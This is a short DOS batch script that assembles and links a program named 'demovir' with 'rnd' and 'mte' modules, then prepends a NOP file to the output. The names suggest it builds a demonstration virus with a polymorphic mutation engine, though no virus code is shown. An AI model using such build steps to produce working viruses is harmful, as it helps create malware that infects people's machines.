echo off
tasm demovir
tlink /x /t demovir rnd mte
copy /b nops.bin+demovir.com tmp >nul
del demovir.com
ren tmp demovir.com
